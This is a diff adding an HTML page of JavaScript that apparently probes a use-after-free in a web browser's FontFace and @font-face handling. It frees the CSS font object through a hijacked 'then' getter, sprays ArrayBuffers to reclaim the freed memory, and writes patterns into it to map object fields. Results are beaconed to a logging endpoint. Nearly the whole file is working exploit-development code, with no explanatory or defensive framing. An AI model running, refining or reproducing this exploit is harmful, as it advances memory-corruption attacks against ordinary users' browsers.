@@ -1,0 +1,240 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1140v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1140v2: CSS-CONNECTED FONTFACE ORACLE ===');
+log('info','Get @font-face FontFace ref, trigger UAF, spray, probe properties');
+B('P1140V2-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var cssFace=null;
+var jsFace=null;
+
+// Step 1: Create @font-face rule
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:f"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+
+// Force the font to be registered
+document.body.offsetHeight;
+
+// Step 2: Find the CSS-connected FontFace
+document.fonts.forEach(function(face){
+  try{
+    if(face.family==='f'+r){cssFace=face;}
+  }catch(e){}
+});
+
+// Step 3: Read properties BEFORE UAF (baseline)
+var beforeProps={};
+var PROPS=['status','family','style','weight','stretch','unicodeRange',
+           'variant','featureSettings','display'];
+
+if(cssFace){
+  log('ok','Got CSS-connected FontFace: family='+cssFace.family);
+  for(var i=0;i<PROPS.length;i++){
+    var p=PROPS[i];
+    try{beforeProps[p]=String(cssFace[p]).substring(0,80);}
+    catch(e){beforeProps[p]='ERR:'+e.message.substring(0,60);}
+  }
+  B('P1140V2-BEFORE',JSON.stringify(beforeProps));
+}else{
+  log('fail','CSS FontFace not found in document.fonts');
+  B('P1140V2-NOFACE','not_found');
+}
+
+// Step 4: Also create JS API FontFace for the UAF trigger
+jsFace=new FontFace('g'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(jsFace);void jsFace.loaded;
+
+// Step 5: Trigger UAF via then getter - free the @font-face CSSFontFace
+var uafHit=false;
+var spray192=[];
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+
+  // Remove stylesheet → frees CSSFontFace for @font-face f<r>
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // Spray to reclaim
+  for(var k=0;k<120;k++) spray192.push(new ArrayBuffer(192));
+
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em g'+r+', f'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  // Find UAF buffer
+  var uafView=null,uafIdx=-1;
+  for(var k=0;k<spray192.length;k++){
+    var v=new BigUint64Array(spray192[k]);
+    if(v[0]===1n&&v[11]!==0n&&v[13]!==0n){
+      var h=Number(v[11]>>32n);
+      if(h>=0x10&&h<=0xFF){
+        uafView=v;uafIdx=k;break;
+      }
+    }
+  }
+
+  log('info','UAF buffer: '+(uafView?'idx='+uafIdx+' q11='+hex64(uafView[11]):'NONE'));
+  B('P1140V2-UAF',uafView?'idx='+uafIdx+'|q11='+hex64(uafView[11]):'none');
+
+  if(!cssFace){
+    B('P1140V2-DONE','no_css_face');
+    return;
+  }
+
+  // ===== PART A: Read CSS FontFace properties AFTER UAF (still original memory) =====
+  log('phase','--- Part A: CSS FontFace after UAF (unmodified) ---');
+  var afterProps={};
+  for(var i=0;i<PROPS.length;i++){
+    var p=PROPS[i];
+    try{afterProps[p]=String(cssFace[p]).substring(0,80);}
+    catch(e){afterProps[p]='ERR:'+e.message.substring(0,60);}
+  }
+  B('P1140V2-AFTER',JSON.stringify(afterProps));
+
+  // Compare before vs after
+  var diffs_uaf=[];
+  for(var i=0;i<PROPS.length;i++){
+    var p=PROPS[i];
+    if(beforeProps[p]!==afterProps[p]){
+      diffs_uaf.push(p+':'+beforeProps[p]+'->'+afterProps[p]);
+    }
+  }
+  log('info','Before vs After UAF: '+(diffs_uaf.length>0?diffs_uaf.join(', '):'NO CHANGES'));
+  B('P1140V2-DIFFS-UAF',diffs_uaf.length>0?diffs_uaf.join('|'):'none');
+
+  if(!uafView){
+    B('P1140V2-DONE','no_uaf_buf|face_diffs='+diffs_uaf.length);
+    return;
+  }
+
+  // ===== PART B: Zero the UAF memory and re-read CSS FontFace =====
+  log('phase','--- Part B: Zero UAF memory, re-read CSS FontFace ---');
+  var originals=[];
+  for(var q=0;q<uafView.length;q++) originals.push(uafView[q]);
+
+  // Zero all
+  for(var q=0;q<uafView.length;q++) uafView[q]=0n;
+
+  var zeroProps={};
+  for(var i=0;i<PROPS.length;i++){
+    var p=PROPS[i];
+    try{zeroProps[p]=String(cssFace[p]).substring(0,80);}
+    catch(e){zeroProps[p]='ERR:'+e.message.substring(0,60);}
+  }
+  B('P1140V2-ZERO',JSON.stringify(zeroProps));
+
+  var diffs_zero=[];
+  for(var i=0;i<PROPS.length;i++){
+    var p=PROPS[i];
+    if(afterProps[p]!==zeroProps[p]){
+      diffs_zero.push(p+':'+afterProps[p]+'->'+zeroProps[p]);
+    }
+  }
+
+  if(diffs_zero.length>0){
+    log('win','MEMORY WRITE CHANGED PROPERTIES! '+diffs_zero.join(', '));
+    B('P1140V2-DIFFS-ZERO',diffs_zero.join('|'));
+  }else{
+    log('info','Zero-fill: no property changes (FontFace wrapper owns its own CSSFontFace or caches values)');
+    B('P1140V2-DIFFS-ZERO','none');
+  }
+
+  // Restore
+  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
+
+  // ===== PART C: Try fonts.check/forEach after zero =====
+  log('phase','--- Part C: fonts API after memory modification ---');
+
+  // Zero again for fonts API test
+  for(var q=0;q<uafView.length;q++) uafView[q]=0n;
+
+  var apiResults={};
+  try{apiResults.has=String(document.fonts.has(cssFace));}
+  catch(e){apiResults.has='ERR:'+e.message.substring(0,40);}
+
+  try{apiResults.check=String(document.fonts.check('1em f'+r));}
+  catch(e){apiResults.check='ERR:'+e.message.substring(0,40);}
+
+  try{
+    var count=0;
+    document.fonts.forEach(function(f){count++;});
+    apiResults.forEach_count=count;
+  }catch(e){apiResults.forEach='ERR:'+e.message.substring(0,40);}
+
+  // Try load() on the CSS face
+  try{
+    var loadResult=cssFace.load();
+    apiResults.load='Promise';
+    loadResult.then(
+      function(v){B('P1140V2-LOAD-OK',String(v).substring(0,80));},
+      function(e){B('P1140V2-LOAD-ERR',e.message.substring(0,80));}
+    );
+  }catch(e){apiResults.load='ERR:'+e.message.substring(0,40);}
+
+  B('P1140V2-API',JSON.stringify(apiResults));
+  log('info','API results: '+JSON.stringify(apiResults));
+
+  // Restore
+  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
+
+  // ===== PART D: Write specific patterns to different qwords and probe =====
+  log('phase','--- Part D: Per-field writes ---');
+  var fieldResults=[];
+
+  for(var testQ=0;testQ<24;testQ++){
+    // Restore all
+    for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
+    // Modify just this one qword
+    uafView[testQ]=0xAAAAAAAABBBBBBBBn;
+
+    var changed=false;
+    for(var i=0;i<PROPS.length;i++){
+      var p=PROPS[i];
+      try{
+        var val=String(cssFace[p]).substring(0,80);
+        if(val!==afterProps[p]){
+          fieldResults.push({q:testQ,prop:p,from:afterProps[p],to:val});
+          changed=true;
+        }
+      }catch(e){
+        if(afterProps[p]!=='ERR:'+e.message.substring(0,60)){
+          fieldResults.push({q:testQ,prop:p,from:afterProps[p],to:'ERR:'+e.message.substring(0,40)});
+          changed=true;
+        }
+      }
+    }
+  }
+
+  // Restore
+  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
+
+  if(fieldResults.length>0){
+    log('win','FIELD MAPPING FOUND! '+fieldResults.length+' changes');
+    for(var i=0;i<fieldResults.length;i++){
+      var f=fieldResults[i];
+      log('win','  q'+f.q+' -> '+f.prop+': '+f.from+' -> '+f.to);
+    }
+    B('P1140V2-FIELDS',JSON.stringify(fieldResults.slice(0,10)));
+  }else{
+    log('info','No per-field changes detected');
+    B('P1140V2-FIELDS','none');
+  }
+
+  B('P1140V2-DONE','uaf_diffs='+diffs_uaf.length+'|zero_diffs='+diffs_zero.length+'|fields='+fieldResults.length);
+  log('phase','=== DONE: '+diffs_uaf.length+' UAF diffs, '+diffs_zero.length+' zero diffs, '+fieldResults.length+' field maps ===');
+},15);
+</script></body></html>
